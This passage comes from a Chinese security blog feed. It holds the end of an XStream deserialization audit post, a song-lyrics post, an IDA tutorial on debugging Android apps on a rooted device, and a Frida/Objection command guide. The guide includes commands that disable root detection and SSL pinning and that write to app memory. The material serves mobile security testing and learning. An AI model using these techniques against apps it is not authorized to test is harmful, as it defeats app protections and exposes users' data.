&#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();</span><br><span class="line">            System.out.println(<span class="string">&quot;命令执行完成，退出码：&quot;</span> + exitCode);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/v1ntlyn/p/14034019.html</span><br><span class="line">https://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</span><br><span class="line">http://x-stream.github.io/converters.html</span><br><span class="line">https://x-stream.github.io/CVE-2020-26217.html</span><br><span class="line">https://mp.weixin.qq.com/s/0kWEaeZipT45BGyCu05z5A</span><br><span class="line">https://xz.aliyun.com/t/8694</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> JAVA </tag>
            
            <tag> Xstream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小站杂货店-歌曲分享一</title>
      <link href="/2024/03/18/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E6%AD%8C%E6%9B%B2%E5%88%86%E4%BA%AB%E4%B8%80/"/>
      <url>/2024/03/18/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E6%AD%8C%E6%9B%B2%E5%88%86%E4%BA%AB%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script>    <div id="aplayer-GLpxQeWm" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="544151118" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="歌曲背景"><a href="#歌曲背景" class="headerlink" title="歌曲背景"></a>歌曲背景</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">《鹿港小镇》是罗大佑1982年首张专辑《之乎者也》中的第一首歌，据业内人士评价，这首歌也是罗大佑</span><br><span class="line">第一支政治歌曲。词曲皆由罗大佑本人包办，但是他本人却未曾到过歌曲中唱到的鹿港小镇。据罗大佑本人</span><br><span class="line">描述，歌曲的灵感源于一个洗车的小伙，在两人的交谈中罗大佑了解到小伙子来自鹿港小镇，当时的台湾经</span><br><span class="line">济正处于崛起和发展中，百废待兴，但与此同时城乡经济发展的不平衡也迫使一部分劳动力从贫穷落后的小</span><br><span class="line">地方集中到发展迅速的城市中，祈求能找到好的机会，但现实却总让人伤......</span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">作词 : 罗大佑</span><br><span class="line">作曲 : 罗大佑</span><br><span class="line">编曲 : 山崎稔</span><br><span class="line"></span><br><span class="line">假如你先生来自鹿港小镇</span><br><span class="line">请问你是否看见我的爹娘</span><br><span class="line">我家就住在妈祖庙的后面</span><br><span class="line">卖着香火的那家小杂货店</span><br><span class="line">假如你先生来自鹿港小镇</span><br><span class="line">请问你是否看见我的爱人</span><br><span class="line">想当年我离家时她一十八</span><br><span class="line">有一颗善良的心和一卷长发</span><br><span class="line"></span><br><span class="line">台北不是我的家</span><br><span class="line">我的家乡没有霓虹灯</span><br><span class="line">鹿港的街道 鹿港的渔村</span><br><span class="line">妈祖庙里烧香的人们</span><br><span class="line"></span><br><span class="line">台北不是我的家</span><br><span class="line">我的家乡没有霓虹灯</span><br><span class="line">鹿港的清晨 鹿港的黄昏</span><br><span class="line">徘徊在文明里的人们</span><br><span class="line"></span><br><span class="line">假如你先生回到鹿港小镇</span><br><span class="line">请问你是否告诉我的爹娘</span><br><span class="line">台北不是我想象的黄金天堂</span><br><span class="line">都市里没有当初我的梦想</span><br><span class="line">在梦里我再度回到鹿港小镇</span><br><span class="line">庙里膜拜的人们依然虔诚</span><br><span class="line">岁月掩不住爹娘淳朴的笑容</span><br><span class="line">梦中的姑娘依然长发盈空</span><br><span class="line"></span><br><span class="line">台北不是我的家</span><br><span class="line">我的家乡没有霓虹灯</span><br><span class="line">鹿港的街道 鹿港的渔村</span><br><span class="line">妈祖庙里烧香的人们</span><br><span class="line"></span><br><span class="line">台北不是我的家</span><br><span class="line">我的家乡没有霓虹灯</span><br><span class="line">鹿港的清晨 鹿港的黄昏</span><br><span class="line">徘徊在文明里的人们</span><br><span class="line"></span><br><span class="line">再度我唱起这首歌</span><br><span class="line">我的歌中和有风雨声</span><br><span class="line">归不到的家园 鹿港的小镇</span><br><span class="line">当年离家的年轻人</span><br><span class="line"></span><br><span class="line">台北不是我的家</span><br><span class="line">我的家乡没有霓虹灯</span><br><span class="line">繁荣的都市 过渡的小镇</span><br><span class="line">徘徊在文明里的人们</span><br><span class="line"></span><br><span class="line">哦----</span><br><span class="line">听说他们挖走了家乡的红砖砌上了水泥墙</span><br><span class="line">家乡的人们得到他们想要的却又失去他们拥有的</span><br><span class="line">门上的一块斑驳的木板刻着这么几句话</span><br><span class="line">子子孙孙永宝用 世世代代传香火</span><br><span class="line"></span><br><span class="line">啊,鹿港的小镇</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小站杂货店-路上的风景，需要思考、感受</title>
      <link href="/2024/02/16/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E8%B7%AF%E4%B8%8A%E7%9A%84%E9%A3%8E%E6%99%AF%EF%BC%8C%E9%9C%80%E8%A6%81%E6%80%9D%E8%80%83%E3%80%81%E6%84%9F%E5%8F%97/"/>
      <url>/2024/02/16/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E8%B7%AF%E4%B8%8A%E7%9A%84%E9%A3%8E%E6%99%AF%EF%BC%8C%E9%9C%80%E8%A6%81%E6%80%9D%E8%80%83%E3%80%81%E6%84%9F%E5%8F%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/private/find_your_life.jpg" data-caption="Find_Your_Life"><img src="/../images/private/find_your_life.jpg" alt="Find_Your_Life"></a></p><h2 id="路上的风景，需要思考、感受"><a href="#路上的风景，需要思考、感受" class="headerlink" title="路上的风景，需要思考、感受"></a>路上的风景，需要思考、感受</h2><p>“人们都嘲笑我。” “为什么呢？” “因为我想写故事。”  - 如果做某件事会让你开心，那么你只管去做，无论别人说了什么。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 小站杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动安全-IDA 动态调试 APP</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-IDA%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%20APP/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-IDA%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%20APP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>IDA 动态调试 APP 操作流程记录。本文主要内容分为两部分，设备 root 后刷入 Magisk 插件配置调试所有 APP 权限以及 IDA 动态调试APP 操作步骤。</p><h2 id="二、配置调试权限"><a href="#二、配置调试权限" class="headerlink" title="二、配置调试权限"></a>二、配置调试权限</h2><p>首先需要一台 root 的安卓手机，设置里打开 开发者选项，勾选USB调试。其次需检查手机设备是否具备调试所有 APP 的权限，具体检查方法 adb shell 后输入 getprop ro.debuggable ，若输出为 1 则为成功开启了调试权限，若为0则未开启。开启方法如下：</p><p>1、使用 MagiskHidePropsConf 修改 getprop ro.debuggable&#x3D;1，目的是设置所有 app 可调试，该方法即 root 后利用 Magisk 插件 MagiskHidePropsConf 开启权限。面具安装方法不再这里阐述。插件下载地址：<a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf">https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf</a> 然后在面具 app 中-》模块-》从本地安装-》选择下载的 MagiskHidePropsConf 然后重启手机。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213140854.jpg" data-caption="微信图片_20240213140854"><img src="/../images/mobile/ida/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213140854.jpg" alt="微信图片_20240213140854"></a></p><p>2、重启手机后进行 adb shell，执行 props 进入插件配置开启权限，具体操作截图如下：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">props</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110219811.png" data-caption="image-20240204110219811"><img src="/../images/mobile/ida/image-20240204110219811.png" alt="image-20240204110219811"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110336419.png" data-caption="image-20240204110336419"><img src="/../images/mobile/ida/image-20240204110336419.png" alt="image-20240204110336419"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110526798.png" data-caption="image-20240204110526798"><img src="/../images/mobile/ida/image-20240204110526798.png" alt="image-20240204110526798"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110542131.png" data-caption="image-20240204110542131"><img src="/../images/mobile/ida/image-20240204110542131.png" alt="image-20240204110542131"></a></p><p>重启后进入 adb 输入 getprop ro.debuggable ，若输出为 1 则为成功开启了调试权限</p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110743170.png" data-caption="image-20240204110743170"><img src="/../images/mobile/ida/image-20240204110743170.png" alt="image-20240204110743170"></a></p><h2 id="三、IDA-调试-APP"><a href="#三、IDA-调试-APP" class="headerlink" title="三、IDA 调试 APP"></a>三、IDA 调试 APP</h2><p>1、在 ida 安装目录 &#x2F;dbgsrv找到对应的 android_server ，32 位 arm 就是 android_server </p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204095233694.png" data-caption="image-20240204095233694"><img src="/../images/mobile/ida/image-20240204095233694.png" alt="image-20240204095233694"></a></p><p>2、然后利用 adb 上传至手机上的 &#x2F;data&#x2F;local&#x2F;tmp 目录下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb.exe push C:\Users\Boom\Desktop\app\IDA_Pro_8.3\dbgsrv\android_server64 /data/local/tmp</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204101243016.png" data-caption="image-20240204101243016"><img src="/../images/mobile/ida/image-20240204101243016.png" alt="image-20240204101243016"></a></p><p>3、adb shell 进入 Android 设备，给予 android_server64 权限，并启动服务端</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">chmod +x 777 android_server64</span><br><span class="line">./android_server64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204101558154.png" data-caption="image-20240204101558154"><img src="/../images/mobile/ida/image-20240204101558154.png" alt="image-20240204101558154"></a></p><p>4、IDA 调试，adb 转发本机端口到安卓 android_server 监听的端口，然后打开 IDA 选择 Go Work on your own</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204111907048.png" data-caption="image-20240204111907048"><img src="/../images/mobile/ida/image-20240204111907048.png" alt="image-20240204111907048"></a></p><p>5、进入到 IDA 界面，选择远程调试</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Debugger-&gt;Attach-&gt;Remote ARMLinux/Android debugger</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204111450366.png" data-caption="image-20240204111450366"><img src="/../images/mobile/ida/image-20240204111450366.png" alt="image-20240204111450366"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204111616630.png" data-caption="image-20240204111616630"><img src="/../images/mobile/ida/image-20240204111616630.png" alt="image-20240204111616630"></a></p><p>6、找到需要调试的 APP PID号</p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204112126337.png" data-caption="image-20240204112126337"><img src="/../images/mobile/ida/image-20240204112126337.png" alt="image-20240204112126337"></a></p><p>选择需要调试的 PID 进行调试即可</p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204112401666.png" data-caption="image-20240204112401666"><img src="/../images/mobile/ida/image-20240204112401666.png" alt="image-20240204112401666"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204112813449.png" data-caption="image-20240204112813449"><img src="/../images/mobile/ida/image-20240204112813449.png" alt="image-20240204112813449"></a></p><h2 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/GH-123/p/13413063.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/660604996</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
            <tag> IDA </tag>
            
            <tag> 动态调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动安全-Ojection 基本操作使用指南</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Ojection%20%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Ojection%20%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>Objection 是基于 Frida 框架开发的一个工具，它提供了一组便捷的功能和脚本，以简化在移动应用程序中使用 Frida 进行动态分析和漏洞利用的过程。</p><h2 id="二、基本配置"><a href="#二、基本配置" class="headerlink" title="二、基本配置"></a>二、基本配置</h2><h3 id="安装-objection"><a href="#安装-objection" class="headerlink" title="安装 objection"></a>安装 objection</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida==12.8.0</span><br><span class="line">pip3 install frida-tools==5.3.0</span><br><span class="line">pip3 install objection==1.8.4</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119165326651.png" data-caption="image-20240119165326651"><img src="/../images/mobile/objection/image-20240119165326651.png" alt="image-20240119165326651"></a></p><h3 id="启动服务端，手机端开启对应版本的-frida-server"><a href="#启动服务端，手机端开启对应版本的-frida-server" class="headerlink" title="启动服务端，手机端开启对应版本的 frida-server"></a>启动服务端，手机端开启对应版本的 frida-server</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">funsiooo@ubuntu:~/tools/app/platform-tools$ ./adb shell</span><br><span class="line">dipper:/ $ su</span><br><span class="line">dipper:/ # cd data/app_test/                                                                                 </span><br><span class="line">dipper:/data/app_test # ./fs16.1.6</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119170729257.png" data-caption="image-20240119170729257"><img src="/../images/mobile/objection/image-20240119170729257.png" alt="image-20240119170729257"></a></p><h3 id="定位-app-包名，寻找需要-hook-app-的包名"><a href="#定位-app-包名，寻找需要-hook-app-的包名" class="headerlink" title="定位 app 包名，寻找需要 hook app 的包名"></a>定位 app 包名，寻找需要 hook app 的包名</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240212200601158.png" data-caption="image-20240212200601158"><img src="/../images/mobile/objection/image-20240212200601158.png" alt="image-20240212200601158"></a></p><h3 id="启动-Objection"><a href="#启动-Objection" class="headerlink" title="启动 Objection"></a>启动 Objection</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">● 正常启动</span><br><span class="line">objection -g &lt;包名&gt; explore</span><br><span class="line"></span><br><span class="line">● 指定IP端口</span><br><span class="line">objection -N -h &lt;手机ip地址&gt; -p &lt;端口&gt; -g &lt;包名&gt; explore</span><br><span class="line"></span><br><span class="line">● spawn 启动前 hook</span><br><span class="line">objection -N -h 192.168.1.3 -p 9999 -g 包名 explore --startup-command &quot;android hooking watch class &#x27;包名.类名&#x27;&quot;</span><br><span class="line"> </span><br><span class="line">● spawn 启动前 Hook 并打印参数、返回值、函数调用栈</span><br><span class="line">objection -N -h 192.168.1.3 -p 9999 -g 包名 explore --startup-command &quot;android hooking watch class_method &#x27;包名.类名.方法&#x27;  --dump-args --dump-return --dump-backtrace&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119170941606-17077397233601.png" data-caption="image-20240119170941606"><img src="/../images/mobile/objection/image-20240119170941606-17077397233601.png" alt="image-20240119170941606"></a></p><h2 id="三、基本使用"><a href="#三、基本使用" class="headerlink" title="三、基本使用"></a>三、基本使用</h2><p>启动 Objection 在其终端执行相关命令以便快速获取想要的信息。</p><h3 id="查看当前-APP-环境"><a href="#查看当前-APP-环境" class="headerlink" title="查看当前 APP 环境"></a>查看当前 APP 环境</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119170956328-17077398521185.png" data-caption="image-20240119170956328"><img src="/../images/mobile/objection/image-20240119170956328-17077398521185.png" alt="image-20240119170956328"></a></p><h3 id="导入外部-hook-脚本"><a href="#导入外部-hook-脚本" class="headerlink" title="导入外部 hook 脚本"></a>导入外部 hook 脚本</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import /Desktop/Hook.js</span><br></pre></td></tr></table></figure></div><h3 id="Memory-指令，提取内存信息"><a href="#Memory-指令，提取内存信息" class="headerlink" title="Memory 指令，提取内存信息"></a>Memory 指令，提取内存信息</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">● 查看内存中加载的库</span><br><span class="line">memory list modules</span><br><span class="line"></span><br><span class="line">● 查看某个库的导出函数</span><br><span class="line">memory list exports 文件名.so</span><br><span class="line"></span><br><span class="line">● 将结果保存到 json 文件中</span><br><span class="line">memory list exports 文件名.so --json /电脑上的路径/libart.json</span><br><span class="line"></span><br><span class="line">● 搜索内存中字符串</span><br><span class="line">memory search &quot;需要搜索的字符串&quot; --string</span><br><span class="line"></span><br><span class="line">● 展示搜索到的偏移地址，不展示附近内存</span><br><span class="line">memory search &quot;61 61 61 71 71 71&quot; --offsets-only</span><br><span class="line"></span><br><span class="line">● 写入内存数据</span><br><span class="line">memory write 0x12fc9c78 &#x27;61 61 61&#x27;</span><br><span class="line"></span><br><span class="line">● 提取内存数据</span><br><span class="line">memory dump from_base 0x12fc9c78 9 /root/memory.txt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119171102364-17077399638287.png" data-caption="image-20240119171102364"><img src="/../images/mobile/objection/image-20240119171102364-17077399638287.png" alt="image-20240119171102364"></a></p><h3 id="Hook-内存漫游"><a href="#Hook-内存漫游" class="headerlink" title="Hook 内存漫游"></a>Hook 内存漫游</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">● 枚举 activity</span><br><span class="line">android hooking list activities</span><br><span class="line"></span><br><span class="line">● 列出内存中所有的类</span><br><span class="line">android hooking list classes</span><br><span class="line"></span><br><span class="line">● 列出类的所有方法</span><br><span class="line">android hooking list class_methods 包名.类名</span><br><span class="line"></span><br><span class="line">● 在内存中所有已加载的类中搜索包含特定关键词的类</span><br><span class="line">android hooking search classes 包名包含的关键词</span><br><span class="line"></span><br><span class="line">● 搜索内存中所有已加载类的所有方法</span><br><span class="line">android hooking search methods 方法名</span><br><span class="line"></span><br><span class="line">● 查找类的所有实例</span><br><span class="line">android heap search instances 类名</span><br><span class="line"></span><br><span class="line">● hook 类的所有方法</span><br><span class="line">android hooking watch class 包名.类名</span><br><span class="line"></span><br><span class="line">● hook 类单个方法</span><br><span class="line">android hooking watch class_method 包名.类名.方法 --dump-args --dump-backtrace --dump-return</span><br><span class="line"></span><br><span class="line">● hook 其中一个重载函数，指定参数类型，多个参数用逗号分隔</span><br><span class="line">android hooking watch class_method 包名.类名.方法 &quot;参数1,参数2&quot;</span><br><span class="line"></span><br><span class="line">● 生成hook脚本</span><br><span class="line">android hooking generate simple 包名.类名</span><br></pre></td></tr></table></figure></div><h3 id="查看组件"><a href="#查看组件" class="headerlink" title="查看组件"></a>查看组件</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">● 查看 APP 的组件使用</span><br><span class="line">android hooking list activities</span><br><span class="line">android hooking list services</span><br><span class="line">android hooking list receivers</span><br><span class="line">android hooking list providers</span><br><span class="line"></span><br><span class="line">● 获取当前 activity</span><br><span class="line">android hooking get current_activity</span><br><span class="line"></span><br><span class="line">● 启动指定 activity</span><br><span class="line">android intent launch_activity xxxx</span><br><span class="line"></span><br><span class="line">● 启动指定service</span><br><span class="line">android intent launch_service xxxx</span><br></pre></td></tr></table></figure></div><h3 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">● 查看Hook任务列表</span><br><span class="line">jobs list</span><br><span class="line"></span><br><span class="line">● 取消Hook任务</span><br><span class="line">jobs kill jobid</span><br></pre></td></tr></table></figure></div><h3 id="Root-指令"><a href="#Root-指令" class="headerlink" title="Root 指令"></a>Root 指令</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">● 尝试关闭 app 的 root 检测</span><br><span class="line">android root disable</span><br><span class="line"></span><br><span class="line">● 尝试关闭 sslpinning 校验</span><br><span class="line">android sslpinning disable</span><br><span class="line"></span><br><span class="line">● 尝试模拟 root 环境</span><br><span class="line">android root simulate</span><br><span class="line"></span><br><span class="line">● 执行命令</span><br><span class="line">android shell_exec ls</span><br></pre></td></tr></table></figure></div><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 